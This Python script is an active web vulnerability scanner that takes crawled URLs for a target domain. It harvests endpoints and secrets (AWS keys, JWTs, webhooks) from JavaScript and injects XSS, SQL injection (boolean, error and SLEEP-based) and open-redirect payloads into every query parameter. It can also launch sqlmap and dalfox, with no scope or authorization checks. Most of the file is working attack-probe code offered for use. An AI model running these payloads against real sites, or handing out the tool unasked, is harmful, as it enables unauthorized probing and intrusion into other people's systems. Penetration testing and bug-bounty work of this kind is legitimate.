#!/usr/bin/env python3
"""
vulnscan.py — Post-katana active vulnerability triage
Author: 0xSH4N

Pipeline this is meant to sit after:
    subfinder -d target.com -silent | httpx -silent -o alive.txt
    katana -list alive.txt -o urls.txt
    python3 vulnscan.py -i urls.txt -o results/

What it does, in order:
  1. Normalize + dedupe urls.txt, bucket into: pages (w/ params), JS files, raw endpoints
  2. JS enumeration    -> pull every JS file, regex for endpoints/secrets/params (LinkFinder-style)
  3. Param discovery   -> merge katana params + JS-discovered params per host/path
  4. Reflected XSS     -> canary token reflection probe, then context-aware payload confirm
  5. SQL Injection     -> error-based (DB fingerprint regex) + boolean-based + light time-based
  6. Open Redirect     -> param-value + Location-header based detection, same-site aware
  7. Optional external tools, used ONLY if present on PATH (never required):
        httpx, dalfox, sqlmap, gf, qsreplace, subjs, nuclei
  8. Writes: results/js_endpoints.txt, results/xss.txt, results/sqli.txt,
             results/openredirect.txt, results/report.json, results/report.html

Everything has a pure-Python fallback so it runs with zero extra installs.
Install extras on your Kali box for deeper confirmation (all optional):
    sudo apt install -y sqlmap
    go install github.com/hahwul/dalfox/v2@latest
    go install github.com/tomnomnom/qsreplace@latest
    go install github.com/projectdiscovery/httpx/cmd/httpx@latest
    pip3 install aiohttp beautifulsoup4

Usage:
    python3 vulnscan.py -i urls.txt -o results/ -c 40 --timeout 10
    python3 vulnscan.py -i urls.txt -o results/ --skip-sqli      # xss+redirect+js only
    python3 vulnscan.py -i urls.txt -o results/ --use-dalfox --use-sqlmap
    python3 vulnscan.py -i urls.txt -o results/ --header "Cookie: session=xyz"
"""

import argparse
import asyncio
import json
import os
import random
import re
import shutil
import string
import subprocess
import sys
import time
from dataclasses import dataclass, field
from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode, quote

try:
    import aiohttp
except ImportError:
    print("[!] aiohttp is required: pip3 install --break-system-packages aiohttp")
    sys.exit(1)

# ─────────────────────────────── config / constants ────────────────────────────────

DEFAULT_UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 vulnscan/1.0"

JS_EXT_RE = re.compile(r"\.js(\?.*)?$", re.I)
STATIC_EXT_RE = re.compile(
    r"\.(png|jpe?g|gif|svg|webp|ico|woff2?|ttf|eot|css|mp4|mp3|pdf|zip|gz|tar|avi|mov)(\?.*)?$",
    re.I,
)

# LinkFinder-style endpoint regex (paths/urls embedded in JS)
JS_ENDPOINT_RE = re.compile(
    r"""(?:"|')
    (
        (?:/|\.\./|\./)
        [^"'><,;\s()\[\]{}]{1,250}
        |
        [a-zA-Z0-9_?/=\-&.]{2,}\.(?:php|asp|aspx|jsp|json|action|api)(?:[?#][^"']*)?
        |
        https?://[a-zA-Z0-9\-._~%]+(?:/[^"'><,;\s()\[\]{}]*)?
    )
    (?:"|')""",
    re.VERBOSE,
)

# Secrets / interesting tokens inside JS (fast triage, not exhaustive)
JS_SECRET_PATTERNS = {
    "aws_key": re.compile(r"AKIA[0-9A-Z]{16}"),
    "google_api": re.compile(r"AIza[0-9A-Za-z\-_]{35}"),
    "firebase": re.compile(r"[a-z0-9.-]+\.firebaseio\.com"),
    "jwt": re.compile(r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}"),
    "slack_webhook": re.compile(r"hooks\.slack\.com/services/[A-Za-z0-9/]+"),
    "generic_secret_assign": re.compile(
        r"(?:secret|api[_-]?key|access[_-]?token|auth[_-]?token|private[_-]?key)\s*[:=]\s*['\"][A-Za-z0-9_\-./+=]{8,}['\"]",
        re.I,
    ),
}

# DB error fingerprints -> error-based SQLi
SQL_ERRORS = {
    "MySQL": re.compile(r"SQL syntax.*MySQL|Warning.*mysqli?_|MySQLSyntaxErrorException|you have an error in your sql syntax", re.I),
    "PostgreSQL": re.compile(r"PostgreSQL.*ERROR|pg_query\(\)|pg_exec\(\)|unterminated quoted string", re.I),
    "MSSQL": re.compile(r"Unclosed quotation mark|Microsoft OLE DB Provider|SQLServer JDBC Driver|System\.Data\.SqlClient", re.I),
    "Oracle": re.compile(r"ORA-\d{5}|Oracle error|Oracle.*Driver", re.I),
    "SQLite": re.compile(r"SQLite/JDBCDriver|SQLite\.Exception|System\.Data\.SQLite\.SQLiteException", re.I),
    "Generic": re.compile(r"SQL syntax|syntax error.*query|unclosed quotation|quoted string not properly terminated", re.I),
}

SQLI_ERROR_PAYLOADS = ["'", "\"", "')", "\")", "';--", "' OR '1'='1", "\" OR \"1\"=\"1", "' AND 1=CONVERT(int,(SELECT 1))--"]
SQLI_BOOL_TRUE = "' OR '1'='1'-- -"
SQLI_BOOL_FALSE = "' AND '1'='2'-- -"
SQLI_TIME_PAYLOAD_MYSQL = "' OR SLEEP(5)-- -"
SQLI_TIME_PAYLOAD_PG = "' OR pg_sleep(5)-- -"

XSS_CANARY_PREFIX = "zXc"
XSS_CANARY_SUFFIX = "qZx"

def make_canary():
    tok = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"{XSS_CANARY_PREFIX}{tok}{XSS_CANARY_SUFFIX}"

def xss_payloads(canary):
    # Ordered simplest -> most context-breaking; first reflection decides which we escalate with
    return [
        canary,
        f"<{canary}>",
        f"\"><script>{canary}</script>",
        f"'><svg/onload={canary}>",
        f"\"><img src=x onerror={canary}>",
        f"javascript:{canary}",
        f"'-{canary}-'",
        f"</script><script>{canary}</script>",
    ]

OPEN_REDIRECT_PARAM_HINTS = re.compile(
    r"^(url|u|redirect|redirect_uri|redirect_url|next|dest|destination|continue|return|return_to|returl|returnurl|r|go|target|link|out|view|forward|path)$",
    re.I,
)
OPEN_REDIRECT_PAYLOADS = [
    "https://evil-vulnscan-test.example.com",
    "//evil-vulnscan-test.example.com",
    "https:evil-vulnscan-test.example.com",
    "/\\evil-vulnscan-test.example.com",
]

# ─────────────────────────────── data structures ────────────────────────────────

@dataclass
class Finding:
    kind: str           # xss | sqli | open_redirect | js_secret | js_endpoint
    url: str
    param: str = ""
    payload: str = ""
    evidence: str = ""
    severity: str = "info"
    extra: dict = field(default_factory=dict)

    def to_line(self):
        if self.param:
            return f"[{self.severity.upper()}] {self.kind} | {self.url} | param={self.param} | payload={self.payload} | {self.evidence}"
        return f"[{self.severity.upper()}] {self.kind} | {self.url} | {self.evidence}"


class Results:
    def __init__(self):
        self.findings: list[Finding] = []
        self.lock = asyncio.Lock()

    async def add(self, f: Finding):
        async with self.lock:
            self.findings.append(f)
            print("    -> " + f.to_line())

    def by_kind(self, kind):
        return [f for f in self.findings if f.kind == kind]


# ─────────────────────────────── helpers ────────────────────────────────

def load_urls(path):
    urls = []
    with open(path, "r", errors="ignore") as fh:
        for line in fh:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if not line.startswith("http"):
                continue
            urls.append(line)
    # dedupe preserving order
    seen = set()
    out = []
    for u in urls:
        if u not in seen:
            seen.add(u)
            out.append(u)
    return out


def bucket_urls(urls):
    js_urls, param_urls, plain_urls = [], [], []
    for u in urls:
        if JS_ENDPOINT_IS_STATIC := STATIC_EXT_RE.search(u):
            continue  # skip images/fonts/etc entirely
        if JS_EXT_RE.search(urlsplit(u).path):
            js_urls.append(u)
            continue
        qs = parse_qsl(urlsplit(u).query)
        if qs:
            param_urls.append(u)
        else:
            plain_urls.append(u)
    return js_urls, param_urls, plain_urls


def inject_param(url, param, value):
    parts = urlsplit(url)
    qs = parse_qsl(parts.query, keep_blank_values=True)
    new_qs = [(k, value if k == param else v) for k, v in qs]
    return urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(new_qs, quote_via=quote), parts.fragment))


def same_registrable_host(host_a, host_b):
    def reg(h):
        parts = h.split(".")
        return ".".join(parts[-2:]) if len(parts) >= 2 else h
    return reg(host_a) == reg(host_b)


def parse_headers(raw_list):
    headers = {}
    for item in raw_list or []:
        if ":" in item:
            k, v = item.split(":", 1)
            headers[k.strip()] = v.strip()
    return headers


def which_tools():
    tools = ["httpx", "dalfox", "sqlmap", "gf", "qsreplace", "subjs", "nuclei"]
    return {t: shutil.which(t) for t in tools}


# ─────────────────────────────── core scanner ────────────────────────────────

class Scanner:
    def __init__(self, args):
        self.args = args
        self.sem = asyncio.Semaphore(args.concurrency)
        self.headers = {"User-Agent": DEFAULT_UA, **parse_headers(args.header)}
        self.results = Results()
        self.session: aiohttp.ClientSession | None = None
        self.js_param_map: dict[str, set[str]] = {}   # path (no query) -> discovered param names
        self.tools = which_tools()

    async def __aenter__(self):
        timeout = aiohttp.ClientTimeout(total=self.args.timeout)
        connector = aiohttp.TCPConnector(limit=self.args.concurrency, ssl=False)
        self.session = aiohttp.ClientSession(timeout=timeout, connector=connector, headers=self.headers)
        return self

    async def __aexit__(self, *exc):
        await self.session.close()

    async def fetch(self, url, method="GET", allow_redirects=False, data=None):
        async with self.sem:
            try:
                async with self.session.request(method, url, allow_redirects=allow_redirects, data=data) as resp:
                    try:
                        body = await resp.text(errors="ignore")
                    except Exception:
                        body = ""
                    return resp, body
            except asyncio.TimeoutError:
                return None, ""
            except aiohttp.ClientError:
                return None, ""
            except Exception:
                return None, ""

    # ---------- stage 1: JS enumeration ----------

    async def enum_js(self, js_urls):
        print(f"[*] JS enumeration: {len(js_urls)} files")
        endpoints_found = set()
        tasks = [self._enum_one_js(u, endpoints_found) for u in js_urls]
        await asyncio.gather(*tasks)
        return endpoints_found

    async def _enum_one_js(self, url, endpoints_found):
        resp, body = await self.fetch(url)
        if not resp or not body:
            return
        for m in JS_ENDPOINT_RE.finditer(body):
            ep = m.group(1)
            if len(ep) < 2 or ep.startswith("//"):
                continue
            endpoints_found.add(ep)
            await self.results.add(Finding(kind="js_endpoint", url=url, evidence=ep, severity="info"))
        for name, pat in JS_SECRET_PATTERNS.items():
            for m in pat.finditer(body):
                snippet = m.group(0)
                redacted = snippet[:6] + "..." + snippet[-4:] if len(snippet) > 14 else snippet
                await self.results.add(Finding(kind="js_secret", url=url, evidence=f"{name}: {redacted}", severity="high"))

    # ---------- stage 2: param collection (katana params + JS endpoints with query strings) ----------

    def harvest_js_params(self, endpoints):
        for ep in endpoints:
            if "?" not in ep:
                continue
            path, _, qs = ep.partition("?")
            params = {k for k, _ in parse_qsl(qs)}
            if params:
                self.js_param_map.setdefault(path, set()).update(params)

    # ---------- stage 3: reflected XSS ----------

    async def test_xss(self, param_urls):
        if self.args.skip_xss:
            return
        print(f"[*] XSS testing: {len(param_urls)} param'd URLs")
        tasks = [self._xss_one_url(u) for u in param_urls]
        await asyncio.gather(*tasks)

    async def _xss_one_url(self, url):
        parts = urlsplit(url)
        qs = parse_qsl(parts.query, keep_blank_values=True)
        for param, _ in qs:
            canary = make_canary()
            # Step 1: cheap reflection probe
            probe_url = inject_param(url, param, canary)
            resp, body = await self.fetch(probe_url)
            if not resp or canary not in body:
                continue
            ctype = resp.headers.get("Content-Type", "")
            if "html" not in ctype and ctype != "":
                # reflected but not rendered as HTML -> low value, note and move on
                await self.results.add(Finding(
                    kind="xss", url=probe_url, param=param, payload=canary,
                    evidence=f"reflected in non-HTML content-type ({ctype})", severity="low"))
                continue

            # Step 2: escalate with context-breaking payloads, confirm unescaped reflection
            confirmed = False
            for payload in xss_payloads(canary):
                if payload == canary:
                    continue
                test_url = inject_param(url, param, payload)
                r2, b2 = await self.fetch(test_url)
                if not r2:
                    continue
                if payload in b2:  # raw, unescaped, exact payload reflected back
                    await self.results.add(Finding(
                        kind="xss", url=test_url, param=param, payload=payload,
                        evidence="payload reflected unescaped in HTML response", severity="high"))
                    confirmed = True
                    break
            if not confirmed:
                await self.results.add(Finding(
                    kind="xss", url=probe_url, param=param, payload=canary,
                    evidence="canary reflected but special chars appear encoded/stripped (needs manual check)",
                    severity="medium"))

    # ---------- stage 4: SQL injection ----------

    async def test_sqli(self, param_urls):
        if self.args.skip_sqli:
            return
        print(f"[*] SQLi testing: {len(param_urls)} param'd URLs")
        tasks = [self._sqli_one_url(u) for u in param_urls]
        await asyncio.gather(*tasks)

    async def _sqli_one_url(self, url):
        parts = urlsplit(url)
        qs = parse_qsl(parts.query, keep_blank_values=True)
        if not qs:
            return

        # baseline response for boolean-based diffing
        base_resp, base_body = await self.fetch(url)
        if not base_resp:
            return
        base_len = len(base_body)
        base_status = base_resp.status

        for param, orig_val in qs:
            # --- error-based ---
            for payload in SQLI_ERROR_PAYLOADS:
                test_url = inject_param(url, param, orig_val + payload)
                r, b = await self.fetch(test_url)
                if not r:
                    continue
                for dbname, pat in SQL_ERRORS.items():
                    m = pat.search(b)
                    if m:
                        await self.results.add(Finding(
                            kind="sqli", url=test_url, param=param, payload=payload,
                            evidence=f"error-based, {dbname} fingerprint: {m.group(0)[:80]}", severity="critical",
                            extra={"method": "error-based"}))
                        break
                else:
                    continue
                break  # stop after first confirmed error payload for this param

            # --- boolean-based ---
            true_url = inject_param(url, param, orig_val + SQLI_BOOL_TRUE)
            false_url = inject_param(url, param, orig_val + SQLI_BOOL_FALSE)
            rt, bt = await self.fetch(true_url)
            rf, bf = await self.fetch(false_url)
            if rt and rf:
                len_t, len_f = len(bt), len(bf)
                if rt.status == base_status and abs(len_t - base_len) < max(5, base_len * 0.02) and abs(len_f - base_len) > max(15, base_len * 0.05):
                    await self.results.add(Finding(
                        kind="sqli", url=true_url, param=param, payload=SQLI_BOOL_TRUE,
                        evidence=f"boolean-based: TRUE resp len~base({len_t}~{base_len}), FALSE resp diverges ({len_f})",
                        severity="high", extra={"method": "boolean-based"}))

            # --- light time-based (only if explicitly enabled: slow & noisy) ---
            if self.args.time_based:
                for payload in (SQLI_TIME_PAYLOAD_MYSQL, SQLI_TIME_PAYLOAD_PG):
                    test_url = inject_param(url, param, orig_val + payload)
                    t0 = time.monotonic()
                    r, b = await self.fetch(test_url)
                    elapsed = time.monotonic() - t0
                    if r and elapsed >= 4.5:
                        await self.results.add(Finding(
                            kind="sqli", url=test_url, param=param, payload=payload,
                            evidence=f"time-based: response took {elapsed:.1f}s (expected ~5s delay)",
                            severity="critical", extra={"method": "time-based"}))
                        break

    # ---------- stage 5: open redirect ----------

    async def test_open_redirect(self, param_urls):
        if self.args.skip_redirect:
            return
        print(f"[*] Open redirect testing: {len(param_urls)} param'd URLs")
        tasks = [self._redirect_one_url(u) for u in param_urls]
        await asyncio.gather(*tasks)

    async def _redirect_one_url(self, url):
        parts = urlsplit(url)
        qs = parse_qsl(parts.query, keep_blank_values=True)
        orig_host = parts.netloc
        for param, _ in qs:
            hinted = bool(OPEN_REDIRECT_PARAM_HINTS.match(param))
            for payload in OPEN_REDIRECT_PAYLOADS:
                test_url = inject_param(url, param, payload)
                resp, body = await self.fetch(test_url, allow_redirects=False)
                if not resp:
                    continue
                if resp.status in (301, 302, 303, 307, 308):
                    loc = resp.headers.get("Location", "")
                    if not loc:
                        continue
                    loc_host = urlsplit(loc).netloc
                    if loc_host and "evil-vulnscan-test.example.com" in loc_host:
                        await self.results.add(Finding(
                            kind="open_redirect", url=test_url, param=param, payload=payload,
                            evidence=f"Location header redirects off-site: {loc}",
                            severity="high" if hinted else "medium"))
                        break
                elif "evil-vulnscan-test.example.com" in body and ("meta http-equiv" in body.lower() or "location.href" in body.lower()):
                    await self.results.add(Finding(
                        kind="open_redirect", url=test_url, param=param, payload=payload,
                        evidence="client-side redirect (meta-refresh/JS) to off-site payload",
                        severity="medium"))
                    break

    # ---------- optional external tool augmentation ----------

    def run_external(self, param_urls, js_urls):
        """Best-effort shellouts to real Kali/Go tools if present. Never fatal if missing."""
        out_dir = self.args.output
        if self.tools.get("subjs") and js_urls:
            print("[*] subjs available but JS enum already handled in-process; skipping (use --use-subjs to force)")

        if self.args.use_dalfox and self.tools.get("dalfox") and param_urls:
            print("[*] Running dalfox for deep XSS confirmation...")
            list_path = os.path.join(out_dir, "_dalfox_input.txt")
            with open(list_path, "w") as fh:
                fh.write("\n".join(param_urls))
            out_path = os.path.join(out_dir, "dalfox_results.txt")
            try:
                subprocess.run(
                    ["dalfox", "file", list_path, "-o", out_path, "--silence"],
                    timeout=self.args.ext_timeout, check=False,
                )
                print(f"    dalfox output -> {out_path}")
            except Exception as e:
                print(f"    dalfox failed: {e}")

        if self.args.use_sqlmap and self.tools.get("sqlmap") and param_urls:
            print(f"[*] Running sqlmap (batch, light) on up to {min(len(param_urls), self.args.sqlmap_limit)} URLs...")
            sqlmap_dir = os.path.join(out_dir, "sqlmap")
            os.makedirs(sqlmap_dir, exist_ok=True)
            for u in param_urls[: self.args.sqlmap_limit]:
                try:
                    subprocess.run(
                        ["sqlmap", "-u", u, "--batch", "--level=1", "--risk=1",
                         "--output-dir", sqlmap_dir, "--disable-coloring"],
                        timeout=self.args.ext_timeout, check=False,
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                    )
                except Exception as e:
                    print(f"    sqlmap failed on {u}: {e}")
            print(f"    sqlmap output dir -> {sqlmap_dir}")

    # ---------- orchestration ----------

    async def run(self, urls):
        js_urls, param_urls, plain_urls = bucket_urls(urls)
        print(f"[*] Input: {len(urls)} urls -> {len(js_urls)} JS, {len(param_urls)} with params, {len(plain_urls)} plain")

        endpoints = await self.enum_js(js_urls)
        self.harvest_js_params(endpoints)

        if self.js_param_map:
            extra = sum(len(v) for v in self.js_param_map.values())
            print(f"[*] JS-discovered params across {len(self.js_param_map)} paths ({extra} total) -- "
                  f"cross-check these manually against katana's param list for coverage gaps")

        await asyncio.gather(
            self.test_xss(param_urls),
            self.test_sqli(param_urls),
            self.test_open_redirect(param_urls),
        )

        self.run_external(param_urls, js_urls)
        return endpoints


# ─────────────────────────────── output writers ────────────────────────────────

def write_outputs(out_dir, results: Results, endpoints, tools, elapsed, total_urls):
    os.makedirs(out_dir, exist_ok=True)

    def dump(kind, fname):
        items = results.by_kind(kind)
        with open(os.path.join(out_dir, fname), "w") as fh:
            for f in items:
                fh.write(f.to_line() + "\n")
        return items

    xss = dump("xss", "xss.txt")
    sqli = dump("sqli", "sqli.txt")
    redir = dump("open_redirect", "openredirect.txt")
    secrets = dump("js_secret", "js_secrets.txt")

    with open(os.path.join(out_dir, "js_endpoints.txt"), "w") as fh:
        for ep in sorted(endpoints):
            fh.write(ep + "\n")

    report = {
        "scanned_urls": total_urls,
        "elapsed_seconds": round(elapsed, 1),
        "external_tools_detected": {k: bool(v) for k, v in tools.items()},
        "counts": {
            "xss": len(xss), "sqli": len(sqli),
            "open_redirect": len(redir), "js_secrets": len(secrets),
            "js_endpoints": len(endpoints),
        },
        "findings": [f.__dict__ for f in results.findings],
    }
    with open(os.path.join(out_dir, "report.json"), "w") as fh:
        json.dump(report, fh, indent=2)

    # tiny standalone HTML summary (no external deps, opens offline)
    def esc(s):
        return (s or "").replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

    rows = "\n".join(
        f"<tr class='{esc(f.severity)}'><td>{esc(f.severity.upper())}</td><td>{esc(f.kind)}</td>"
        f"<td><code>{esc(f.url)}</code></td><td>{esc(f.param)}</td>"
        f"<td><code>{esc(f.payload)}</code></td><td>{esc(f.evidence)}</td></tr>"
        for f in sorted(results.findings, key=lambda x: {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}.get(x.severity, 5))
    )
    html = f"""<!doctype html><html><head><meta charset="utf-8"><title>vulnscan report</title>
<style>
body{{font-family:-apple-system,Segoe UI,Roboto,sans-serif;background:#0b0e14;color:#dce1e8;margin:2rem}}
h1{{color:#fff}} table{{width:100%;border-collapse:collapse;font-size:13px}}
td,th{{border:1px solid #232834;padding:6px 8px;text-align:left;vertical-align:top}}
th{{background:#161a24}} code{{color:#9ecbff;word-break:break-all}}
tr.critical{{background:#3a1414}} tr.high{{background:#3a2414}} tr.medium{{background:#33321a}}
tr.low{{background:#15222b}} tr.info{{background:#11141a}}
.summary{{display:flex;gap:1rem;margin:1rem 0;flex-wrap:wrap}}
.card{{background:#161a24;padding:1rem;border-radius:8px;min-width:120px}}
.card b{{font-size:1.4rem;display:block}}
</style></head><body>
<h1>vulnscan report</h1>
<p>{total_urls} URLs scanned in {elapsed:.1f}s</p>
<div class="summary">
<div class="card"><b>{len(sqli)}</b>SQLi</div>
<div class="card"><b>{len(xss)}</b>XSS</div>
<div class="card"><b>{len(redir)}</b>Open Redirect</div>
<div class="card"><b>{len(secrets)}</b>JS Secrets</div>
<div class="card"><b>{len(endpoints)}</b>JS Endpoints</div>
</div>
<table><tr><th>Sev</th><th>Kind</th><th>URL</th><th>Param</th><th>Payload</th><th>Evidence</th></tr>
{rows}
</table>
</body></html>"""
    with open(os.path.join(out_dir, "report.html"), "w") as fh:
        fh.write(html)

    return report


# ─────────────────────────────── main ────────────────────────────────

def build_argparser():
    p = argparse.ArgumentParser(description="Post-katana active vuln triage: JS enum, XSS, SQLi, open redirect")
    p.add_argument("-i", "--input", required=True, help="urls.txt from katana")
    p.add_argument("-o", "--output", default="results", help="output directory")
    p.add_argument("-c", "--concurrency", type=int, default=30)
    p.add_argument("--timeout", type=int, default=10, help="per-request timeout (s)")
    p.add_argument("--ext-timeout", type=int, default=300, help="timeout for each external tool invocation (s)")
    p.add_argument("--header", action="append", help='extra header, e.g. --header "Cookie: session=xyz" (repeatable)')
    p.add_argument("--skip-xss", action="store_true")
    p.add_argument("--skip-sqli", action="store_true")
    p.add_argument("--skip-redirect", action="store_true")
    p.add_argument("--time-based", action="store_true", help="enable time-based SQLi checks (slow, noisy, use sparingly)")
    p.add_argument("--use-dalfox", action="store_true", help="also run dalfox on param urls if installed")
    p.add_argument("--use-sqlmap", action="store_true", help="also run sqlmap on param urls if installed")
    p.add_argument("--sqlmap-limit", type=int, default=15, help="max URLs to hand to sqlmap (it's slow)")
    return p


async def main_async(args):
    urls = load_urls(args.input)
    if not urls:
        print("[!] No http(s) URLs found in input file.")
        sys.exit(1)

    t0 = time.monotonic()
    async with Scanner(args) as scanner:
        endpoints = await scanner.run(urls)
        elapsed = time.monotonic() - t0
        report = write_outputs(args.output, scanner.results, endpoints, scanner.tools, elapsed, len(urls))

    print("\n" + "=" * 60)
    print(f"Done in {elapsed:.1f}s. Summary:")
    for k, v in report["counts"].items():
        print(f"  {k:15s}: {v}")
    print(f"\nReports written to: {os.path.abspath(args.output)}")
    print(f"  - report.html   (open in browser)")
    print(f"  - report.json   (machine-readable, full detail)")
    print(f"  - xss.txt / sqli.txt / openredirect.txt / js_secrets.txt / js_endpoints.txt")
    detected = [k for k, v in scanner.tools.items() if v]
    if detected:
        print(f"\nExternal tools detected on PATH: {', '.join(detected)} "
              f"(use --use-dalfox / --use-sqlmap to engage them)")
    else:
        print("\nNo optional external tools (dalfox/sqlmap/etc) detected -- ran fully pure-Python.")


def main():
    args = build_argparser().parse_args()
    try:
        asyncio.run(main_async(args))
    except KeyboardInterrupt:
        print("\n[!] Interrupted.")
        sys.exit(130)


if __name__ == "__main__":
    main()
